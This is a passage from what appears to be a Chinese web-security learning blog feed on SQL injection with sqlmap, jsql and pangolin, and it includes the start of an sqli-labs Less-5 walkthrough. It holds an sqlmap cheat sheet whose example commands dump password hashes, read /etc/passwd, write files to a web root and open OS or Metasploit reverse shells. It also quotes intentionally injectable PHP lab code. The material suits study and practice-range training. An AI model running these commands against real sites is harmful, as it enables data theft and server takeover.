punctuation">[</span>13:34:35<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> confirming Oracle<span class="token punctuation">[</span>13:34:35<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is Oracleback-end DBMS: Oracle<span class="token punctuation">[</span>13:34:35<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/root/.local/share/sqlmap/output/219.153.49.228'</span><span class="token punctuation">[</span>13:34:35<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> your sqlmap version is outdated<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 13:34:35 /2021-06-23/</code></pre><h4 id="5、mongoDB注入"><a href="#5、mongoDB注入" class="headerlink" title="5、mongoDB注入"></a><font size="4"><strong>5、mongoDB注入</strong></font></h4><p>参考文档：<a href="https://www.cnblogs.com/wefeng/p/11503102.html">https://www.cnblogs.com/wefeng/p/11503102.html</a><br>SQLmap不能识别MongoDB这里介绍nosqlattack:<a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a></p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:47077/new_list.php?id=1 --batch</span><span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL<span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> the target URL content is stable<span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL content is stable<span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> GET parameter <span class="token string">'id'</span> is dynamic<span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> GET parameter <span class="token string">'id'</span> appears to be dynamic<span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> heuristic <span class="token punctuation">(</span>basic<span class="token punctuation">)</span> <span class="token function">test</span> shows that GET parameter <span class="token string">'id'</span> might not be injectable<span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">for</span> SQL injection on GET parameter <span class="token string">'id'</span><span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'AND boolean-based blind - WHERE or HAVING clause'</span><span class="token punctuation">[</span>13:53:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Boolean-based blind - Parameter replace (original value)'</span><span class="token punctuation">[</span>13:53:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span><span class="token punctuation">[</span>13:53:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL AND error-based - WHERE or HAVING clause'</span><span class="token punctuation">[</span>13:53:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'</span><span class="token punctuation">[</span>13:53:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Oracle AND error-based - WHERE or HAVING clause (XMLType)'</span><span class="token punctuation">[</span>13:53:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'</span><span class="token punctuation">[</span>13:53:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic inline queries'</span><span class="token punctuation">[</span>13:53:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL > 8.1 stacked queries (comment)'</span><span class="token punctuation">[</span>13:53:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Microsoft SQL Server/Sybase stacked queries (comment)'</span><span class="token punctuation">[</span>13:53:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'</span><span class="token punctuation">[</span>13:53:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'</span><span class="token punctuation">[</span>13:53:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL > 8.1 AND time-based blind'</span><span class="token punctuation">[</span>13:53:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Microsoft SQL Server/Sybase time-based blind (IF)'</span><span class="token punctuation">[</span>13:53:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Oracle AND time-based blind'</span>it is recommended to perform only basic UNION tests <span class="token keyword">if</span> there is not at least one other <span class="token punctuation">(</span>potential<span class="token punctuation">)</span> technique found. Do you want to reduce the number of requests? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y<span class="token punctuation">[</span>13:53:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic UNION query (NULL) - 1 to 10 columns'</span><span class="token punctuation">[</span>13:53:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> GET parameter <span class="token string">'id'</span> does not seem to be injectable<span class="token punctuation">[</span>13:53:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>CRITICAL<span class="token punctuation">]</span> all tested parameters <span class="token keyword">do</span> not appear to be injectable. Try to increase values <span class="token keyword">for</span> <span class="token string">'--level'</span>/<span class="token string">'--risk'</span> options <span class="token keyword">if</span> you wish to perform <span class="token function">more</span> tests. If you suspect that there is some kind of protection mechanism involved <span class="token punctuation">(</span>e.g. WAF<span class="token punctuation">)</span> maybe you could try to use option <span class="token string">'--tamper'</span> <span class="token punctuation">(</span>e.g. <span class="token string">'--tamper=space2comment'</span><span class="token punctuation">)</span> and/or switch <span class="token string">'--random-agent'</span><span class="token punctuation">[</span>13:53:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> your sqlmap version is outdated</code></pre><h3 id="二、SQLmap使用方法"><a href="#二、SQLmap使用方法" class="headerlink" title="二、SQLmap使用方法"></a><font size="5"><strong>二、SQLmap使用方法</strong></font></h3><p><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/5.png"></p><pre class=" language-bash"><code class="language-bash">基本操作笔记：-u  <span class="token comment" spellcheck="true">#注入点 </span>-f  <span class="token comment" spellcheck="true">#指纹判别数据库类型 </span>-b  <span class="token comment" spellcheck="true">#获取数据库版本信息 </span>-p  <span class="token comment" spellcheck="true">#指定可测试的参数(?page=1&amp;id=2 -p "page,id") </span>-D <span class="token string">""</span>  <span class="token comment" spellcheck="true">#指定数据库名 </span>-T <span class="token string">""</span>  <span class="token comment" spellcheck="true">#指定表名 </span>-C <span class="token string">""</span>  <span class="token comment" spellcheck="true">#指定字段 </span>-s <span class="token string">""</span>  <span class="token comment" spellcheck="true">#保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log"　　恢复:-s "xx.log" --resume) </span>--level<span class="token operator">=</span><span class="token punctuation">(</span>1-5<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#要执行的测试水平等级，默认为1 </span>--risk<span class="token operator">=</span><span class="token punctuation">(</span>0-3<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#测试执行的风险等级，默认为1 </span>--time-sec<span class="token operator">=</span><span class="token punctuation">(</span>2,5<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#延迟响应，默认为5 </span>--data <span class="token comment" spellcheck="true">#通过POST发送数据 </span>--columns        <span class="token comment" spellcheck="true">#列出字段 </span>--current-user   <span class="token comment" spellcheck="true">#获取当前用户名称 </span>--current-db     <span class="token comment" spellcheck="true">#获取当前数据库名称 </span>--users          <span class="token comment" spellcheck="true">#列数据库所有用户 </span>--passwords      <span class="token comment" spellcheck="true">#数据库用户所有密码 </span>--privileges     <span class="token comment" spellcheck="true">#查看用户权限(--privileges -U root) </span>-U               <span class="token comment" spellcheck="true">#指定数据库用户 </span>--dbs            <span class="token comment" spellcheck="true">#列出所有数据库 </span>--tables -D <span class="token string">""</span>   <span class="token comment" spellcheck="true">#列出指定数据库中的表 </span>--columns -T <span class="token string">"user"</span> -D <span class="token string">"mysql"</span>      <span class="token comment" spellcheck="true">#列出mysql数据库中的user表的所有字段 </span>--dump-all            <span class="token comment" spellcheck="true">#列出所有数据库所有表 </span>--exclude-sysdbs      <span class="token comment" spellcheck="true">#只列出用户自己新建的数据库和表 </span>--dump -T <span class="token string">""</span> -D <span class="token string">""</span> -C <span class="token string">""</span>   <span class="token comment" spellcheck="true">#列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span>--dump -T <span class="token string">""</span> -D <span class="token string">""</span> --start 2 --top 4  <span class="token comment" spellcheck="true"># 列出指定数据库的表的2-4字段的数据 </span>--dbms    <span class="token comment" spellcheck="true">#指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span>--os      <span class="token comment" spellcheck="true">#指定系统(Linux,Windows) </span>-v  <span class="token comment" spellcheck="true">#详细的等级(0-6) </span>    0：只显示Python的回溯，错误和关键消息。     1：显示信息和警告消息。     2：显示调试消息。     3：有效载荷注入。     4：显示HTTP请求。     5：显示HTTP响应头。     6：显示HTTP响应页面的内容 --privileges  <span class="token comment" spellcheck="true">#查看权限 </span>--is-dba      <span class="token comment" spellcheck="true">#是否是数据库管理员 </span>--roles       <span class="token comment" spellcheck="true">#枚举数据库用户角色 </span>--udf-inject  <span class="token comment" spellcheck="true">#导入用户自定义函数（获取系统权限） </span>--union-check  <span class="token comment" spellcheck="true">#是否支持union 注入 </span>--union-cols <span class="token comment" spellcheck="true">#union 查询表记录 </span>--union-test <span class="token comment" spellcheck="true">#union 语句测试 </span>--union-use  <span class="token comment" spellcheck="true">#采用union 注入 </span>--union-tech orderby <span class="token comment" spellcheck="true">#union配合order by </span>--data <span class="token string">""</span> <span class="token comment" spellcheck="true">#POST方式提交数据(--data "page=1&amp;id=2") </span>--cookie <span class="token string">"用;号分开"</span>      <span class="token comment" spellcheck="true">#cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) </span>--referer <span class="token string">""</span>     <span class="token comment" spellcheck="true">#使用referer欺骗(--referer "http://www.baidu.com") </span>--user-agent <span class="token string">""</span>  <span class="token comment" spellcheck="true">#自定义user-agent </span>--proxy <span class="token string">"http://127.0.0.1:8118"</span> <span class="token comment" spellcheck="true">#代理注入 </span>--string<span class="token operator">=</span><span class="token string">""</span>    <span class="token comment" spellcheck="true">#指定关键词,字符串匹配. </span>--threads 　　  <span class="token comment" spellcheck="true">#采用多线程(--threads 3) </span>--sql-shell    <span class="token comment" spellcheck="true">#执行指定sql命令 </span>--sql-query    <span class="token comment" spellcheck="true">#执行指定的sql语句(--sql-query "SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" ) </span>--file-read    <span class="token comment" spellcheck="true">#读取指定文件 </span>--file-write   <span class="token comment" spellcheck="true">#写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span>--file-dest    <span class="token comment" spellcheck="true">#要写入的文件绝对路径 </span>--os-cmd<span class="token operator">=</span>id    <span class="token comment" spellcheck="true">#执行系统命令 </span>--os-shell     <span class="token comment" spellcheck="true">#系统交互shell </span>--os-pwn       <span class="token comment" spellcheck="true">#反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span>--msf-path<span class="token operator">=</span>    <span class="token comment" spellcheck="true">#matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span>--os-smbrelay  <span class="token comment" spellcheck="true"># </span>--os-bof       <span class="token comment" spellcheck="true"># </span>--reg-read     <span class="token comment" spellcheck="true">#读取win系统注册表 </span>--priv-esc     <span class="token comment" spellcheck="true"># </span>--time-sec<span class="token operator">=</span>    <span class="token comment" spellcheck="true">#延迟设置 默认--time-sec=5 为5秒 </span>-p <span class="token string">"user-agent"</span> --user-agent <span class="token string">"sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"</span>  <span class="token comment" spellcheck="true">#指定user-agent注入 </span>--eta          <span class="token comment" spellcheck="true">#盲注 </span>/pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 common-outputs.txt common-tables.txt      表字典 keywords.txt oracle-default-passwords.txt user-agents.txt wordlist.txt 常用语句 <span class="token keyword">:</span>1./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -f -b --current-user --current-db --users --passwords --dbs -v 0 2./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --passwords -U root --union-use -v 2 3./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --dump -T <span class="token function">users</span> -C username -D userdb --start 2 --stop 3 -v 2 4./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --dump -C <span class="token string">"user,pass"</span>  -v 1 --exclude-sysdbs 5./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --sql-shell -v 2 6./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --file-read <span class="token string">"c:\boot.ini"</span> -v 2 7./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 8./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --os-cmd <span class="token string">"id"</span> -v 1 9./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --os-shell --union-use -v 2 10./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --os-pwn --msf-path<span class="token operator">=</span>/opt/framework/msf3 --priv-esc -v 1 11./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --os-pwn --msf-path<span class="token operator">=</span>/opt/framework/msf3 -v 1 12./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --os-bof --msf-path<span class="token operator">=</span>/opt/framework/msf3 -v 1 13./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --reg-add --reg-key<span class="token operator">=</span><span class="token string">"HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap"</span> --reg-value<span class="token operator">=</span>Test --reg-type<span class="token operator">=</span>REG_SZ --reg-data<span class="token operator">=</span>1 14./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --eta 15./sqlmap.py -u <span class="token string">"http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1"</span> -p <span class="token function">id</span> --prefix <span class="token string">"')"</span> --suffix <span class="token string">"AND ('abc'='abc"</span>16./sqlmap.py -u <span class="token string">"http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1"</span> --auth-type Basic --auth-cred <span class="token string">"testuser:testpass"</span>17./sqlmap.py -l burp.log --scope<span class="token operator">=</span><span class="token string">"(www)?\.target\.(com|net|org)"</span>18./sqlmap.py -u <span class="token string">"http://192.168.136.131/sqlmap/mysql/get_int.php?id=1"</span> --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 19./sqlmap.py -u <span class="token string">"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1"</span> --sql-query <span class="token string">"SELECT 'foo'"</span> -v 1 20./sqlmap.py -u <span class="token string">"http://192.168.136.129/mysql/get_int_4.php?id=1"</span> --common-tables -D testdb --banner 21./sqlmap.py -u <span class="token string">"http://192.168.136.129/mysql/get_int_4.php?id=1"</span> --cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low"</span> --string<span class="token operator">=</span><span class="token string">'xx'</span> --dbs --level<span class="token operator">=</span>3 -p <span class="token string">"uid"</span>简单的注入流程 <span class="token keyword">:</span>1.读取数据库版本，当前用户，当前数据库 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -f -b --current-user --current-db -v 1 2.判断当前数据库用户权限 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --privileges -U 用户名 -v 1 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --is-dba -U 用户名 -v 1 3.读取所有数据库用户或指定数据库用户的密码 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --users --passwords -v 2 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --passwords -U root -v 2 4.获取所有数据库 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --dbs -v 2 5.获取指定数据库中的所有表 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --tables -D mysql -v 2 6.获取指定数据库名中指定表的字段 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --columns -D mysql -T <span class="token function">users</span> -v 2 7.获取指定数据库名中指定表中指定字段的数据 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --dump -D mysql -T <span class="token function">users</span> -C <span class="token string">"username,password"</span> -s <span class="token string">"sqlnmapdb.log"</span> -v 2 8.file-read读取web文件 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --file-read <span class="token string">"/etc/passwd"</span> -v 2 9.file-write写入文件到web sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</code></pre><h3 id="三、简要学习各种注入工具的使用指南"><a href="#三、简要学习各种注入工具的使用指南" class="headerlink" title="三、简要学习各种注入工具的使用指南"></a><font size="5"><strong>三、简要学习各种注入工具的使用指南</strong></font></h3><h4 id="1、jsql工具安装使用"><a href="#1、jsql工具安装使用" class="headerlink" title="1、jsql工具安装使用"></a><font size="4"><strong>1、jsql工具安装使用</strong></font></h4><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># apt-get -f install jsql</span>正在读取软件包列表<span class="token punctuation">..</span>. 完成正在分析软件包的依赖关系树正在读取状态信息<span class="token punctuation">..</span>. 完成下列【新】软件包将被安装：  jsql升级了 0 个软件包，新安装了 1 个软件包，要卸载 0 个软件包，有 1573 个软件包未被升级。需要下载 2,500 B 的归档。解压缩后会消耗 9,216 B 的额外空间。获取:1 https://mirrors.aliyun.com/kali kali-rolling/main amd64 jsql all 0.82-0kali2 <span class="token punctuation">[</span>2,500 B<span class="token punctuation">]</span>已下载 2,500 B，耗时 2秒 <span class="token punctuation">(</span>1,099 B/s<span class="token punctuation">)</span>正在选中未选择的软件包 jsql。<span class="token punctuation">(</span>正在读取数据库 <span class="token punctuation">..</span>. 系统当前共安装有 307905 个文件和目录。<span class="token punctuation">)</span>准备解压 <span class="token punctuation">..</span>./jsql_0.82-0kali2_all.deb  <span class="token punctuation">..</span>.正在解压 jsql <span class="token punctuation">(</span>0.82-0kali2<span class="token punctuation">)</span> <span class="token punctuation">..</span>.正在设置 jsql <span class="token punctuation">(</span>0.82-0kali2<span class="token punctuation">)</span> <span class="token punctuation">..</span>.</code></pre><p>启动直接数据jsql<br><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/6.png"><br><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/7.png"><br>对一些简单的注入有用对于post注入的效果不好</p><h4 id="2、pangolin工具使用"><a href="#2、pangolin工具使用" class="headerlink" title="2、pangolin工具使用"></a><font size="4"><strong>2、pangolin工具使用</strong></font></h4><p><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/8.png"></p><p>能够做一些简单的SQL注入、对于post注入效果也不是很好，另外执行的速度也很慢，只能在window平台使用。</p><p>熟悉工具的支持库，注入模式，优缺点等<br>sqlmap, NoSQLAttack , Pangolin等</p><h3 id="四、相关资源"><a href="#四、相关资源" class="headerlink" title="四、相关资源:"></a><font size="5"><strong>四、相关资源:</strong></font></h3><p><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a><br><a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a><br><a href="https://github.com/sqlmapproject/sqlmap/zipball/master">https://github.com/sqlmapproject/sqlmap/zipball/master</a><br>https:&#x2F;blog.csdn.net&#x2F;qq_39936434&#x2F;category_9103379.html<br><a href="https://www.mozhe.cn/bug/WUJ30GVQSTlyeXdvbHU2ZmVOMjVDU7bW96aGUmozhe">https://www.mozhe.cn/bug/WUJ30GVQSTlyeXdvbHU2ZmVOMjVDU7bW96aGUmozhe</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-014</title>
      <link href="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/"/>
      <url>/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-类型及提交注入"><a href="#WEB漏洞-类型及提交注入" class="headerlink" title="WEB漏洞-类型及提交注入"></a><font size="6"><strong>WEB漏洞-类型及提交注入</strong></font></h2><span id="more"></span><p><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/1.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#简要明确参数类型</span>数字，字符，搜索，JsoN等<span class="token comment" spellcheck="true">#简要明确请求方法</span>GET, POST,COOKIE，REQUEST，HTTP头等其中sql语句干扰符号: ',",s,<span class="token punctuation">)</span>,<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;等，具体需看写法</span></code></pre><h3 id="一、参数字符型注入测试"><a href="#一、参数字符型注入测试" class="headerlink" title="一、参数字符型注入测试"></a><font size="5"><strong>一、参数字符型注入测试</strong></font></h3><h4 id="sqlilabs-less-5-6"><a href="#sqlilabs-less-5-6" class="headerlink" title="&#x3D;&gt;sqlilabs less 5 6"></a><font size="4"><strong>&#x3D;&gt;sqlilabs less 5 6</strong></font></h4><p>在靶场中查看源代码</p><pre class=" language-bash"><code class="language-bash">root@9a845c5ed654:/var/www/html/Less-5<span class="token comment" spellcheck="true"># cat index.php</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="token operator">></span><span class="token operator">&lt;</span>html xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/xhtml"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"Content-Type"</span> content<span class="token operator">=</span><span class="token string">"text/html; charset=utf-8"</span> /<span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span>Less-5 Double Query- Single Quotes- String<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body bgcolor<span class="token operator">=</span><span class="token string">"#000000"</span><span class="token operator">></span><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">" margin-top:60px;color:#FFF; font-size:23px; text-align:center"</span><span class="token operator">></span>Welcome<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&lt;</span>font color<span class="token operator">=</span><span class="token string">"#FF0000"</span><span class="token operator">></span> Dhakkan <span class="token operator">&lt;</span>/font<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>font size<span class="token operator">=</span><span class="token string">"3"</span> color<span class="token operator">=</span><span class="token string">"#FFFF00"</span><span class="token operator">></span><span class="token operator">&lt;</span>?php//including the Mysql connect parameters.include<span class="token punctuation">(</span><span class="token string">"../sql-connections/sql-connect.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>error_reporting<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>// take the variablesif<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>//logging the connection parameters to a <span class="token function">file</span> <span class="token keyword">for</span> analysis.<span class="token variable">$fp</span><span class="token operator">=</span>fopen<span class="token punctuation">(</span><span class="token string">'result.txt'</span>,<span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fwrite<span class="token punctuation">(</span><span class="token variable">$fp</span>,<span class="token string">'ID:'</span><span class="token keyword">.</span><span class="token variable">$id</span><span class="token keyword">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fclose<span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>// connectivity<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#SQL执行的语句</span><span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'You are in...........'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token keyword">else</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;font size="3" color="#FFFF00">'</span><span class="token punctuation">;</span>        print_r<span class="token punctuation">(</span>mysql_error<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token keyword">else</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; echo "Please input the ID as parameter with numeric value";&amp;#125;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>/font<span class="token operator">></span> <span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>/br<span class="token operator">></span><span class="token operator">&lt;</span>/br<span class="token operator">></span><span class="token operator">&lt;</span>/br<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"../images/Less-5.jpg"</span> /<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><p>$sql&#x3D;”SELECT * FROM 